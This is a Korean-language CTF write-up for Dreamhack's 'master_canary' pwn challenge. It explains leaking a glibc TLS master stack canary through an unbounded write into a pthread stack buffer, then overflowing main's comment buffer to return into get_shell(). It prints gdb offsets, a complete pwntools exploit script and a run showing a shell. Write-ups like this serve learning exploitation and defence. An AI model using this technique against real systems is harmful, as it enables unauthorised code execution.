---
ctf_name: "Dreamhack-Wargame"
challenge_name: "master_canary"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty:		          # easy / medium / hard / insane
author: "khgkhg05"
date: "2026-07-14"
points:
tags: [ELF, pthread, TLS, stack-canary, BOF]
---

# 문제명

`master_canary`

## 문제 설명

> 주어진 `master_canary` 서비스에서 canary를 우회하고 셸을 획득한다.

- 문제 파일: `master_canary`, `master_canary.c`, `Dockerfile`
- 실행 환경: Ubuntu 16.04, `socat` 기반 TCP 서비스
- 보호 기법: Partial RELRO, Canary, NX, No PIE
- 목표 함수: `get_shell()` at `0x400a4a`

## 풀이

### 분석

바이너리는 메뉴 기반으로 동작한다.

```c
case 1:
    pthread_create(&thread_t, NULL, thread_routine, NULL);
    break;
case 2:
    scanf("%lu", &size);
    read_bytes(global_buffer, size);
    printf("Data: %s", global_buffer);
    break;
case 3:
    read(0, leave_comment, 1024);
    return 0;
```

`case 3`은 `leave_comment[32]`에 최대 1024바이트를 읽기 때문에 일반적인 stack BOF가 가능하다. 다만 `main()`에는 stack canary가 있으므로 canary 값을 알아야 return address를 덮을 수 있다.

canary leak primitive는 thread 쪽에서 나온다.

```c
void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}
```

1번 메뉴로 thread를 만들면 `global_buffer`가 child thread stack의 `buf`를 가리킨다. 이후 2번 메뉴는 `global_buffer`에 사용자가 지정한 `size`만큼 그대로 쓰고, 다시 `%s`로 출력한다. `buf` 크기 제한이 없으므로 child thread stack 위쪽까지 선형으로 덮을 수 있다.

### 취약점

x86-64 glibc의 stack protector는 함수 진입 시 TLS의 `fs:0x28`에 있는 canary를 stack frame에 복사하고, 함수 종료 시 다시 `fs:0x28` 값과 비교한다. 이 TLS에 있는 원본 값을 흔히 master canary라고 부른다.

pthread로 만든 thread에서는 thread stack 위쪽에 TLS가 붙어 있다. Docker 환경에서 gdb로 확인하면 다음과 같다.

```text
Thread 2 pthread base: 0x7ffff77ef700
thread_routine rbp:   0x7ffff77eef50
buf:                  0x7ffff77eee40  (= rbp - 0x110)
TLS canary:            0x7ffff77ef728  (= pthread base + 0x28)
```

따라서 `buf`에서 child thread의 TLS canary까지의 거리는 다음과 같다.

```text
0x7ffff77ef728 - 0x7ffff77eee40 = 0x8e8
```

canary의 첫 바이트는 `0x00`이므로 그대로는 `%s` 출력이 그 지점에서 끊긴다. 그래서 2번 메뉴에서 `0x8e8 + 1`바이트를 써서 canary의 첫 `0x00`만 `A`로 덮으면, 뒤의 canary 바이트가 출력된다.

canary 중간에도 `0x00`이 나올 수 있으므로 solve script에서는 한 번에 7바이트가 모두 나온다고 가정하지 않았다. 이미 알아낸 canary prefix만 non-null로 덮어 다음 구간을 다시 출력하는 방식으로 8바이트를 복구한다.

### 익스플로잇

전체 공격 흐름은 다음과 같다.

1. 1번 메뉴로 child thread를 생성해 `global_buffer`가 thread stack의 `buf`를 가리키게 한다.
2. 2번 메뉴로 `buf + 0x8e8` 위치의 TLS canary 첫 바이트를 덮고 `%s` 출력으로 canary를 leak한다.
3. 중간에 `0x00`이 있으면 같은 방식으로 다음 canary 구간을 추가로 leak한다.
4. 3번 메뉴의 `leave_comment` overflow에서 `0x28`바이트 padding 뒤에 leak한 canary를 넣는다.
5. saved RBP 8바이트를 채우고 return address를 `get_shell()` 주소 `0x400a4a`로 덮는다.

핵심 exploit 코드는 다음과 같다.

```python
from pwn import *

BIN = "./master_canary"
elf = ELF(BIN)

TLS_CANARY_OFFSET = 0x8e8
MAIN_CANARY_OFFSET = 0x28
MENU = b"1. Create thread\n2. Input\n3. Exit\n"

def leak_suffix(p, known_len):
    size = TLS_CANARY_OFFSET + known_len
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", b"A" * size)

    out = p.recvuntil(MENU)
    printed = out[out.find(b"Data: ") + 6 : -len(MENU)]
    return printed[size:]

def leak_canary(p):
    known = bytearray(b"\x00")

    while len(known) < 8:
        suffix = leak_suffix(p, len(known))
        need = 8 - len(known)
        take = suffix[:need]
        known.extend(take)

        if len(take) < need:
            known.append(0)

    return bytes(known[:8])

p = process(BIN)
p.sendlineafter(b"> ", b"1")

canary = leak_canary(p)
payload = b"A" * MAIN_CANARY_OFFSET
payload += canary
payload += b"B" * 8
payload += p64(elf.symbols["get_shell"])

p.sendlineafter(b"> ", b"3")
p.recvuntil(b"Leave comment: ")
p.sendline(payload)
p.interactive()
```

Docker로 문제 환경을 맞춘 뒤 실행하면 셸을 획득할 수 있다.

```text
$ python3 solve.py DOCKER=1 CMD='cat /home/master_canary/flag'
[+] canary: 0xeb3ce73a6a73ae00
DH{REDACTED}
```

## 플래그

```text
DH{REDACTED}
```

## 추가 파일

| 파일 | 설명 |
|------|------|
| `master_canary` | 문제 원본 ELF 바이너리 |
| `master_canary.c` | 문제 원본 C 소스 |
| `solve.py` | TLS master canary leak 후 `get_shell()`로 ret overwrite하는 exploit |

## 배운 점

일반적인 stack canary leak 문제처럼 stack frame 안의 saved canary만 보면 이 문제를 놓치기 쉽다. `thread_routine()`의 stack frame canary는 함수가 끝난 뒤 stale stack에 남는 값이라 안정적인 leak 대상이 아니고, 실제로 봐야 하는 것은 thread stack 위쪽 TLS의 `fs:0x28` master canary이다.

또한 thread별 TLS 주소는 다르지만 canary 값은 같은 random seed에서 복사된다. child thread의 TLS canary를 leak해도 `main()`의 stack canary check를 우회할 수 있는 이유가 여기에 있다.
